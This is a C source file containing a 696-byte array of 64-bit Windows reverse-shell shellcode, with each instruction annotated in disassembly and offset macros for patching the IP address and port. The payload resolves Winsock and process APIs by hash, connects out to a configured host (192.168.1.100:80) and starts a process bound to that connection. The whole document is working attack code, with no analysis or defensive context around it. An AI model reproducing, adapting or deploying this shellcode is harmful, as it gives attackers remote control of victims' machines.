// Generated on 09/09/14 at 11:18:18

// Description     : 64-Bit Reverse shell using Import Address Table
// TCP Address     : 192.168.1.100:80
// Hash algorithm  : ADD/ROL
// Code size       : 696 bytes

#define API_DATA 0x2D  // offset to API/DLL
#define PORT_NBR 0x290 // offset to port number
#define IP_ADDR  0x28C // offset to IP address

/* Size = 696 bytes */

char revbind[] = {
  /***********************************************************************************************************/
  /* 0000 */  "\x53"                                      /*  push rbx                                       */
  /* 0001 */  "\x56"                                      /*  push rsi                                       */
  /* 0002 */  "\x57"                                      /*  push rdi                                       */
  /* 0003 */  "\x55"                                      /*  push rbp                                       */
  /* 0004 */  "\x41\x54"                                  /*  push r12                                       */
  /* 0006 */  "\x41\x55"                                  /*  push r13                                       */
  /* 0008 */  "\x41\x56"                                  /*  push r14                                       */
  /* 000A */  "\x41\x57"                                  /*  push r15                                       */
  /* 000C */  "\xEB\x1A"                                  /*  jmp 00000028h                                  */
  /* 000E */  "\x5E"                                      /*  pop rsi                                        */
  /* 000F */  "\x33\xC0"                                  /*  xor eax, eax                                   */
  /* 0011 */  "\x99"                                      /*  cdq                                            */
  /* 0012 */  "\xB2\xE6"                                  /*  mov dl, E6h                                    */
  /* 0014 */  "\xB6\x01"                                  /*  mov dh, 01h                                    */
  /* 0016 */  "\x48\x03\xD6"                              /*  add rdx, rsi                                   */
  /* 0019 */  "\xFF\xD2"                                  /*  call rdx                                       */
  /* 001B */  "\x41\x5F"                                  /*  pop r15                                        */
  /* 001D */  "\x41\x5E"                                  /*  pop r14                                        */
  /* 001F */  "\x41\x5D"                                  /*  pop r13                                        */
  /* 0021 */  "\x41\x5C"                                  /*  pop r12                                        */
  /* 0023 */  "\x5D"                                      /*  pop rbp                                        */
  /* 0024 */  "\x5F"                                      /*  pop rdi                                        */
  /* 0025 */  "\x5E"                                      /*  pop rsi                                        */
  /* 0026 */  "\x5B"                                      /*  pop rbx                                        */
  /* 0027 */  "\xC3"                                      /*  ret                                            */
  /***********************************************************************************************************/
  /* 0028 */  "\xE8\xE1\xFF\xFF\xFF"                      /*  call 0000000Eh                                 */
  /* 002D */  "\x08\x6B\x65"                              /*  or byte ptr [rbx+65h], ch                      */
  /* 0030 */  "\x72\x6E"                                  /*  jc 000000A0h                                   */
  /* 0032 */  "\x65\x6C"                                  /*  insb                                           */
  /* 0034 */  "\x33\x32"                                  /*  xor esi, dword ptr [rdx]                       */
  /* 0036 */  "\x04\x0C"                                  /*  add al, 0Ch                                    */
  /* 0038 */  "\x4C\x6F"                                  /*  outsd                                          */
  /* 003A */  "\x61"                                      /*  ???                                            */
  /* 003B */  "\x64\x4C\x69\x62\x72\x61\x72\x79\x41"      /*  imul r12, qword ptr fs:[rdx+72h], 41797261h    */
  /* 0044 */  "\x0E"                                      /*  ???                                            */
  /* 0045 */  "\x43\x72\x65"                              /*  jc 000000ADh                                   */
  /* 0048 */  "\x61"                                      /*  ???                                            */
  /* 0049 */  "\x74\x65"                                  /*  je 000000B0h                                   */
  /* 004B */  "\x50"                                      /*  push rax                                       */
  /* 004C */  "\x72\x6F"                                  /*  jc 000000BDh                                   */
  /* 004E */  "\x63\x65\x73"                              /*  movsxd esp, dword ptr [rbp+73h]                */
  /* 0051 */  "\x73\x41"                                  /*  jnc 00000094h                                  */
  /* 0053 */  "\x13\x57\x61"                              /*  adc edx, dword ptr [rdi+61h]                   */
  /* 0056 */  "\x69\x74\x46\x6F\x72\x53\x69\x6E"          /*  imul esi, dword ptr [rsi+rax*2+6Fh], 6E695372h */
  /* 005E */  "\x67\x6C"                                  /*  insb                                           */
  /* 0060 */  "\x65"                                      /*  ???                                            */
  /* 0061 */  "\x4F"                                      /*  ???                                            */
  /* 0062 */  "\x62"                                      /*  ???                                            */
  /* 0063 */  "\x6A\x65"                                  /*  push 00000065h                                 */
  /* 0065 */  "\x63\x74\x0B\x43"                          /*  movsxd esi, dword ptr [rbx+rcx+43h]            */
  /* 0069 */  "\x6C"                                      /*  insb                                           */
  /* 006A */  "\x6F"                                      /*  outsd                                          */
  /* 006B */  "\x73\x65"                                  /*  jnc 000000D2h                                  */
  /* 006D */  "\x48"                                      /*  ???                                            */
  /* 006E */  "\x61"                                      /*  ???                                            */
  /* 006F */  "\x6E"                                      /*  outsb                                          */
  /* 0070 */  "\x64\x6C"                                  /*  insb                                           */
  /* 0072 */  "\x65"                                      /*  ???                                            */
  /* 0073 */  "\x06"                                      /*  ???                                            */
  /* 0074 */  "\x77\x73"                                  /*  jnbe 000000E9h                                 */
  /* 0076 */  "\x32\x5F\x33"                              /*  xor bl, byte ptr [rdi+33h]                     */
  /* 0079 */  "\x32\x04\x0A"                              /*  xor al, byte ptr [rdx+rcx]                     */
  /* 007C */  "\x57"                                      /*  push rdi                                       */
  /* 007D */  "\x53"                                      /*  push rbx                                       */
  /* 007E */  "\x41\x53"                                  /*  push r11                                       */
  /* 0080 */  "\x74\x61"                                  /*  je 000000E3h                                   */
  /* 0082 */  "\x72\x74"                                  /*  jc 000000F8h                                   */
  /* 0084 */  "\x75\x70"                                  /*  jne 000000F6h                                  */
  /* 0086 */  "\x0A\x57\x53"                              /*  or dl, byte ptr [rdi+53h]                      */
  /* 0089 */  "\x41\x53"                                  /*  push r11                                       */
  /* 008B */  "\x6F"                                      /*  outsd                                          */
  /* 008C */  "\x63\x6B\x65"                              /*  movsxd ebp, dword ptr [rbx+65h]                */
  /* 008F */  "\x74\x41"                                  /*  je 000000D2h                                   */
  /* 0091 */  "\x07"                                      /*  ???                                            */
  /* 0092 */  "\x63\x6F\x6E"                              /*  movsxd ebp, dword ptr [rdi+6Eh]                */
  /* 0095 */  "\x6E"                                      /*  outsb                                          */
  /* 0096 */  "\x65\x63\x74\x0B\x63"                      /*  movsxd esi, dword ptr [rbx+rcx+63h]            */
  /* 009B */  "\x6C"                                      /*  insb                                           */
  /* 009C */  "\x6F"                                      /*  outsd                                          */
  /* 009D */  "\x73\x65"                                  /*  jnc 00000104h                                  */
  /* 009F */  "\x73\x6F"                                  /*  jnc 00000110h                                  */
  /* 00A1 */  "\x63\x6B\x65"                              /*  movsxd ebp, dword ptr [rbx+65h]                */
  /* 00A4 */  "\x74\x56"                                  /*  je 000000FCh                                   */
  /* 00A6 */  "\x52"                                      /*  push rdx                                       */
  /* 00A7 */  "\x50"                                      /*  push rax                                       */
  /* 00A8 */  "\x5E"                                      /*  pop rsi                                        */
  /* 00A9 */  "\x33\xC0"                                  /*  xor eax, eax                                   */
  /* 00AB */  "\x99"                                      /*  cdq                                            */
  /* 00AC */  "\xAC"                                      /*  lodsb                                          */
  /* 00AD */  "\x03\xD0"                                  /*  add edx, eax                                   */
  /* 00AF */  "\xC1\xC2\x09"                              /*  rol edx, 09h                                   */
  /* 00B2 */  "\xFF\xC8"                                  /*  dec eax                                        */
  /* 00B4 */  "\x79\xF6"                                  /*  jns 000000ACh                                  */
  /* 00B6 */  "\x92"                                      /*  xchg eax, edx                                  */
  /* 00B7 */  "\x5A"                                      /*  pop rdx                                        */
  /* 00B8 */  "\x5E"                                      /*  pop rsi                                        */
  /* 00B9 */  "\xC3"                                      /*  ret                                            */
  /***********************************************************************************************************/
  /* 00BA */  "\x57"                                      /*  push rdi                                       */
  /* 00BB */  "\x56"                                      /*  push rsi                                       */
  /* 00BC */  "\x55"                                      /*  push rbp                                       */
  /* 00BD */  "\x53"                                      /*  push rbx                                       */
  /* 00BE */  "\x8B\x43\x3C"                              /*  mov eax, dword ptr [rbx+3Ch]                   */
  /* 00C1 */  "\x83\xC0\x18"                              /*  add eax, 18h                                   */
  /* 00C4 */  "\x8B\x44\x18\x78"                          /*  mov eax, dword ptr [rax+rbx+78h]               */
  /* 00C8 */  "\x85\xC0"                                  /*  test eax, eax                                  */
  /* 00CA */  "\x74\x3B"                                  /*  je 00000107h                                   */
  /* 00CC */  "\x48\x8D\x2C\x03"                          /*  lea rbp, qword ptr [rbx+rax]                   */
  /* 00D0 */  "\x55"                                      /*  push rbp                                       */
  /* 00D1 */  "\x5E"                                      /*  pop rsi                                        */
  /* 00D2 */  "\xAD"                                      /*  lodsd                                          */
  /* 00D3 */  "\x92"                                      /*  xchg eax, edx                                  */
  /* 00D4 */  "\xAD"                                      /*  lodsd                                          */
  /* 00D5 */  "\xAD"                                      /*  lodsd                                          */
  /* 00D6 */  "\xAD"                                      /*  lodsd                                          */
  /* 00D7 */  "\x85\xC0"                                  /*  test eax, eax                                  */
  /* 00D9 */  "\x74\x2C"                                  /*  je 00000107h                                   */
  /* 00DB */  "\xAD"                                      /*  lodsd                                          */
  /* 00DC */  "\x56"                                      /*  push rsi                                       */
  /* 00DD */  "\x5D"                                      /*  pop rbp                                        */
  /* 00DE */  "\x48\x8D\x34\x13"                          /*  lea rsi, qword ptr [rbx+rdx]                   */
  /* 00E2 */  "\x48\x8D\x3C\x03"                          /*  lea rdi, qword ptr [rbx+rax]                   */
  /* 00E6 */  "\x48\xAD"                                  /*  lodsq                                          */
  /* 00E8 */  "\x48\xAF"                                  /*  scasq                                          */
  /* 00EA */  "\x85\xC0"                                  /*  test eax, eax                                  */
  /* 00EC */  "\x74\xE2"                                  /*  je 000000D0h                                   */
  /* 00EE */  "\x48\x99"                                  /*  cqo                                            */
  /* 00F0 */  "\xFF\xC2"                                  /*  inc edx                                        */
  /* 00F2 */  "\x74\xF2"                                  /*  je 000000E6h                                   */
  /* 00F4 */  "\x48\x8D\x44\x03\x02"                      /*  lea rax, qword ptr [rbx+rax+02h]               */
  /* 00F9 */  "\xE8\xA7\xFF\xFF\xFF"                      /*  call 000000A5h                                 */
  /* 00FE */  "\x41\x3B\xC0"                              /*  cmp eax, r8d                                   */
  /* 0101 */  "\x75\xE3"                                  /*  jne 000000E6h                                  */
  /* 0103 */  "\x48\x8B\x47\xF8"                          /*  mov rax, qword ptr [rdi-08h]                   */
  /* 0107 */  "\x5B"                                      /*  pop rbx                                        */
  /* 0108 */  "\x5D"                                      /*  pop rbp                                        */
  /* 0109 */  "\x5E"                                      /*  pop rsi                                        */
  /* 010A */  "\x5F"                                      /*  pop rdi                                        */
  /* 010B */  "\xC3"                                      /*  ret                                            */
  /***********************************************************************************************************/
  /* 010C */  "\x53"                                      /*  push rbx                                       */
  /* 010D */  "\x57"                                      /*  push rdi                                       */
  /* 010E */  "\x44\x8B\xC0"                              /*  mov r8d, eax                                   */
  /* 0111 */  "\x6A\x60"                                  /*  push 00000060h                                 */
  /* 0113 */  "\x5B"                                      /*  pop rbx                                        */
  /* 0114 */  "\x65\x48\x8B\x03"                          /*  mov rax, qword ptr [rbx]                       */
  /* 0118 */  "\x48\x8B\x40\x18"                          /*  mov rax, qword ptr [rax+18h]                   */
  /* 011C */  "\x48\x8B\x78\x30"                          /*  mov rdi, qword ptr [rax+30h]                   */
  /* 0120 */  "\xEB\x0D"                                  /*  jmp 0000012Fh                                  */
  /* 0122 */  "\xE8\x93\xFF\xFF\xFF"                      /*  call 000000BAh                                 */
  /* 0127 */  "\x48\x85\xC0"                              /*  test rax, rax                                  */
  /* 012A */  "\x75\x0D"                                  /*  jne 00000139h                                  */
  /* 012C */  "\x48\x8B\x3F"                              /*  mov rdi, qword ptr [rdi]                       */
  /* 012F */  "\x48\x8B\x5F\x10"                          /*  mov rbx, qword ptr [rdi+10h]                   */
  /* 0133 */  "\x48\x85\xDB"                              /*  test rbx, rbx                                  */
  /* 0136 */  "\x75\xEA"                                  /*  jne 00000122h                                  */
  /* 0138 */  "\x93"                                      /*  xchg eax, ebx                                  */
  /* 0139 */  "\x5F"                                      /*  pop rdi                                        */
  /* 013A */  "\x5B"                                      /*  pop rbx                                        */
  /* 013B */  "\xC3"                                      /*  ret                                            */
  /***********************************************************************************************************/
  /* 013C */  "\x57"                                      /*  push rdi                                       */
  /* 013D */  "\x51"                                      /*  push rcx                                       */
  /* 013E */  "\x33\xC0"                                  /*  xor eax, eax                                   */
  /* 0140 */  "\xAC"                                      /*  lodsb                                          */
  /* 0141 */  "\x91"                                      /*  xchg eax, ecx                                  */
  /* 0142 */  "\xF3\xA4"                                  /*  rep movsb                                      */
  /* 0144 */  "\x91"                                      /*  xchg eax, ecx                                  */
  /* 0145 */  "\xAA"                                      /*  stosb                                          */
  /* 0146 */  "\x59"                                      /*  pop rcx                                        */
  /* 0147 */  "\x5F"                                      /*  pop rdi                                        */
  /* 0148 */  "\xC3"                                      /*  ret                                            */
  /***********************************************************************************************************/
  /* 0149 */  "\x4C\x8B\xE4"                              /*  mov r12, rsp                                   */
  /* 014C */  "\x48\x83\xC4\x98"                          /*  add rsp, FFFFFFFFFFFFFF98h                     */
  /* 0150 */  "\xB8\xB0\xAE\x25\xBE"                      /*  mov eax, BE25AEB0h                             */
  /* 0155 */  "\xE8\xB2\xFF\xFF\xFF"                      /*  call 0000010Ch                                 */
  /* 015A */  "\x48\x85\xC0"                              /*  test rax, rax                                  */
  /* 015D */  "\x74\x41"                                  /*  je 000001A0h                                   */
  /* 015F */  "\x48\x93"                                  /*  xchg rax, rbx                                  */
  /* 0161 */  "\xE8\xD6\xFF\xFF\xFF"                      /*  call 0000013Ch                                 */
  /* 0166 */  "\xB8\xB1\x4C\xA6\x51"                      /*  mov eax, 51A64CB1h                             */
  /* 016B */  "\xE8\x9C\xFF\xFF\xFF"                      /*  call 0000010Ch                                 */
  /* 0170 */  "\x48\x85\xC0"                              /*  test rax, rax                                  */
  /* 0173 */  "\x74\x2B"                                  /*  je 000001A0h                                   */
  /* 0175 */  "\x57"                                      /*  push rdi                                       */
  /* 0176 */  "\x59"                                      /*  pop rcx                                        */
  /* 0177 */  "\xFF\xD0"                                  /*  call rax                                       */
  /* 0179 */  "\x48\x85\xC0"                              /*  test rax, rax                                  */
  /* 017C */  "\x74\x22"                                  /*  je 000001A0h                                   */
  /* 017E */  "\x48\x95"                                  /*  xchg rax, rbp                                  */
  /* 0180 */  "\x33\xC0"                                  /*  xor eax, eax                                   */
  /* 0182 */  "\xAC"                                      /*  lodsb                                          */
  /* 0183 */  "\x91"                                      /*  xchg eax, ecx                                  */
  /* 0184 */  "\xE8\xB3\xFF\xFF\xFF"                      /*  call 0000013Ch                                 */
  /* 0189 */  "\x4C\x8B\xF1"                              /*  mov r14, rcx                                   */
  /* 018C */  "\x57"                                      /*  push rdi                                       */
  /* 018D */  "\x5A"                                      /*  pop rdx                                        */
  /* 018E */  "\x55"                                      /*  push rbp                                       */
  /* 018F */  "\x59"                                      /*  pop rcx                                        */
  /* 0190 */  "\xFF\xD3"                                  /*  call rbx                                       */
  /* 0192 */  "\x49\x8B\xCE"                              /*  mov rcx, r14                                   */
  /* 0195 */  "\x85\xC0"                                  /*  test eax, eax                                  */
  /* 0197 */  "\x74\x07"                                  /*  je 000001A0h                                   */
  /* 0199 */  "\x48\xAB"                                  /*  stosq                                          */
  /* 019B */  "\xE2\xE7"                                  /*  loop 00000184h                                 */
  /* 019D */  "\x49\x8B\xE4"                              /*  mov rsp, r12                                   */
  /* 01A0 */  "\xC3"                                      /*  ret                                            */
  /***********************************************************************************************************/
  /* 01A1 */  "\x50"                                      /*  push rax                                       */
  /* 01A2 */  "\x55"                                      /*  push rbp                                       */
  /* 01A3 */  "\x48\x83\xC4\xA8"                          /*  add rsp, FFFFFFFFFFFFFFA8h                     */
  /* 01A7 */  "\x48\x8D\x7B\x20"                          /*  lea rdi, qword ptr [rbx+20h]                   */
  /* 01AB */  "\x99"                                      /*  cdq                                            */
  /* 01AC */  "\xB2\x68"                                  /*  mov dl, 68h                                    */
  /* 01AE */  "\x89\x17"                                  /*  mov dword ptr [rdi], edx                       */
  /* 01B0 */  "\xFF\x47\x3D"                              /*  inc dword ptr [rdi+3Dh]                        */
  /* 01B3 */  "\x48\x8D\x7F\x50"                          /*  lea rdi, qword ptr [rdi+50h]                   */
  /* 01B7 */  "\x48\xAB"                                  /*  stosq                                          */
  /* 01B9 */  "\x48\xAB"                                  /*  stosq                                          */
  /* 01BB */  "\x48\xAB"                                  /*  stosq                                          */
  /* 01BD */  "\x95"                                      /*  xchg eax, ebp                                  */
  /* 01BE */  "\xB8\x9C\x92\x9B\xFF"                      /*  mov eax, FF9B929Ch                             */
  /* 01C3 */  "\xF7\xD0"                                  /*  not eax                                        */
  /* 01C5 */  "\x48\x89\x03"                              /*  mov qword ptr [rbx], rax                       */
  /* 01C8 */  "\x48\x8D\x7C\x24\x20"                      /*  lea rdi, qword ptr [rsp+20h]                   */
  /* 01CD */  "\x48\xAB"                                  /*  stosq                                          */
  /* 01CF */  "\xB8\xFF\xFF\xFF\xF7"                      /*  mov eax, F7FFFFFFh                             */
  /* 01D4 */  "\xF7\xD0"                                  /*  not eax                                        */
  /* 01D6 */  "\x48\xAB"                                  /*  stosq                                          */
  /* 01D8 */  "\x33\xC0"                                  /*  xor eax, eax                                   */
  /* 01DA */  "\x48\xAB"                                  /*  stosq                                          */
  /* 01DC */  "\x48\xAB"                                  /*  stosq                                          */
  /* 01DE */  "\x91"                                      /*  xchg eax, ecx                                  */
  /* 01DF */  "\x48\x8D\x43\x20"                          /*  lea rax, qword ptr [rbx+20h]                   */
  /* 01E3 */  "\x48\xAB"                                  /*  stosq                                          */
  /* 01E5 */  "\x48\xAB"                                  /*  stosq                                          */
  /* 01E7 */  "\x4D\x33\xC9"                              /*  xor r9, r9                                     */
  /* 01EA */  "\x4D\x33\xC0"                              /*  xor r8, r8                                     */
  /* 01ED */  "\x53"                                      /*  push rbx                                       */
  /* 01EE */  "\x5A"                                      /*  pop rdx                                        */
  /* 01EF */  "\xFF\x53\xC8"                              /*  call qword ptr [rbx-38h]                       */
  /* 01F2 */  "\xF7\xD8"                                  /*  neg eax                                        */
  /* 01F4 */  "\x79\x16"                                  /*  jns 0000020Ch                                  */
  /* 01F6 */  "\x92"                                      /*  xchg eax, edx                                  */
  /* 01F7 */  "\x48\x8B\x4B\x20"                          /*  mov rcx, qword ptr [rbx+20h]                   */
  /* 01FB */  "\xFF\x53\xD0"                              /*  call qword ptr [rbx-30h]                       */
  /* 01FE */  "\x48\x8B\x4B\x28"                          /*  mov rcx, qword ptr [rbx+28h]                   */
  /* 0202 */  "\xFF\x53\xD8"                              /*  call qword ptr [rbx-28h]                       */
  /* 0205 */  "\x48\x8B\x4B\x20"                          /*  mov rcx, qword ptr [rbx+20h]                   */
  /* 0209 */  "\xFF\x53\xD8"                              /*  call qword ptr [rbx-28h]                       */
  /* 020C */  "\x48\x83\xEC\xA8"                          /*  sub rsp, FFFFFFFFFFFFFFA8h                     */
  /* 0210 */  "\x5D"                                      /*  pop rbp                                        */
  /* 0211 */  "\x58"                                      /*  pop rax                                        */
  /* 0212 */  "\xC3"                                      /*  ret                                            */
  /***********************************************************************************************************/
  /* 0213 */  "\x4C\x8B\xFC"                              /*  mov r15, rsp                                   */
  /* 0216 */  "\x48\x83\xE4\xF0"                          /*  and rsp, FFFFFFFFFFFFFFF0h                     */
  /* 021A */  "\xB9\x28\xFF\xFF\xFF"                      /*  mov ecx, FFFFFF28h                             */
  /* 021F */  "\xF7\xD9"                                  /*  neg ecx                                        */
  /* 0221 */  "\x48\x2B\xE1"                              /*  sub rsp, rcx                                   */
  /* 0224 */  "\x54"                                      /*  push rsp                                       */
  /* 0225 */  "\x5F"                                      /*  pop rdi                                        */
  /* 0226 */  "\xF3\xAA"                                  /*  rep stosb                                      */
  /* 0228 */  "\x54"                                      /*  push rsp                                       */
  /* 0229 */  "\x5F"                                      /*  pop rdi                                        */
  /* 022A */  "\x48\x83\xC4\xC8"                          /*  add rsp, FFFFFFFFFFFFFFC8h                     */
  /* 022E */  "\xE8\x16\xFF\xFF\xFF"                      /*  call 00000149h                                 */
  /* 0233 */  "\x74\x7F"                                  /*  je 000002B4h                                   */
  /* 0235 */  "\x48\xBA\x88\x8C\xCD\xA0\xCC\xCD\xFF\xFF"  /*  mov rdx, FFFFCDCCA0CD8C88h                     */
  /* 023F */  "\x48\xF7\xD2"                              /*  not rdx                                        */
  /* 0242 */  "\x48\x89\x17"                              /*  mov qword ptr [rdi], rdx                       */
  /* 0245 */  "\x48\x89\x4F\x08"                          /*  mov qword ptr [rdi+08h], rcx                   */
  /* 0249 */  "\x57"                                      /*  push rdi                                       */
  /* 024A */  "\x59"                                      /*  pop rcx                                        */
  /* 024B */  "\xFF\x57\xE0"                              /*  call qword ptr [rdi-20h]                       */
  /* 024E */  "\x48\x85\xC0"                              /*  test rax, rax                                  */
  /* 0251 */  "\x74\x61"                                  /*  je 000002B4h                                   */
  /* 0253 */  "\xE8\xF1\xFE\xFF\xFF"                      /*  call 00000149h                                 */
  /* 0258 */  "\x74\x5A"                                  /*  je 000002B4h                                   */
  /* 025A */  "\x57"                                      /*  push rdi                                       */
  /* 025B */  "\x5B"                                      /*  pop rbx                                        */
  /* 025C */  "\x53"                                      /*  push rbx                                       */
  /* 025D */  "\x5A"                                      /*  pop rdx                                        */
  /* 025E */  "\xB1\x02"                                  /*  mov cl, 02h                                    */
  /* 0260 */  "\xFF\x53\xE0"                              /*  call qword ptr [rbx-20h]                       */
  /* 0263 */  "\x85\xC0"                                  /*  test eax, eax                                  */
  /* 0265 */  "\x75\x4D"                                  /*  jne 000002B4h                                  */
  /* 0267 */  "\x57"                                      /*  push rdi                                       */
  /* 0268 */  "\x5B"                                      /*  pop rbx                                        */
  /* 0269 */  "\x48\x89\x44\x24\x20"                      /*  mov qword ptr [rsp+20h], rax                   */
  /* 026E */  "\x48\x89\x44\x24\x28"                      /*  mov qword ptr [rsp+28h], rax                   */
  /* 0273 */  "\x4D\x33\xC9"                              /*  xor r9, r9                                     */
  /* 0276 */  "\x4D\x33\xC0"                              /*  xor r8, r8                                     */
  /* 0279 */  "\x99"                                      /*  cdq                                            */
  /* 027A */  "\xFF\xC2"                                  /*  inc edx                                        */
  /* 027C */  "\x6A\x02"                                  /*  push 00000002h                                 */
  /* 027E */  "\x59"                                      /*  pop rcx                                        */
  /* 027F */  "\xFF\x53\xE8"                              /*  call qword ptr [rbx-18h]                       */
  /* 0282 */  "\x8B\xE8"                                  /*  mov ebp, eax                                   */
  /* 0284 */  "\xFF\xC0"                                  /*  inc eax                                        */
  /* 0286 */  "\x74\x2C"                                  /*  je 000002B4h                                   */
  /* 0288 */  "\x53"                                      /*  push rbx                                       */
  /* 0289 */  "\x5F"                                      /*  pop rdi                                        */
  /* 028A */  "\x48\xB8\xFD\xFF\xFF\xAF\x3F\x57\xFE\x9B"  /*  mov rax, 9BFE573FAFFFFFFDh                     */
  /* 0294 */  "\x48\xF7\xD0"                              /*  not rax                                        */
  /* 0297 */  "\x48\xAB"                                  /*  stosq                                          */
  /* 0299 */  "\x6A\x10"                                  /*  push 00000010h                                 */
  /* 029B */  "\x41\x58"                                  /*  pop r8                                         */
  /* 029D */  "\x53"                                      /*  push rbx                                       */
  /* 029E */  "\x5A"                                      /*  pop rdx                                        */
  /* 029F */  "\x55"                                      /*  push rbp                                       */
  /* 02A0 */  "\x59"                                      /*  pop rcx                                        */
  /* 02A1 */  "\xFF\x53\xF0"                              /*  call qword ptr [rbx-10h]                       */
  /* 02A4 */  "\x85\xC0"                                  /*  test eax, eax                                  */
  /* 02A6 */  "\x75\x07"                                  /*  jne 000002AFh                                  */
  /* 02A8 */  "\x8B\xC5"                                  /*  mov eax, ebp                                   */
  /* 02AA */  "\xE8\xF2\xFE\xFF\xFF"                      /*  call 000001A1h                                 */
  /* 02AF */  "\x55"                                      /*  push rbp                                       */
  /* 02B0 */  "\x59"                                      /*  pop rcx                                        */
  /* 02B1 */  "\xFF\x53\xF8"                              /*  call qword ptr [rbx-08h]                       */
  /* 02B4 */  "\x49\x8B\xE7"                              /*  mov rsp, r15                                   */
  /* 02B7 */  "\xC3"                                      /*  ret                                            */
  /***********************************************************************************************************/
};
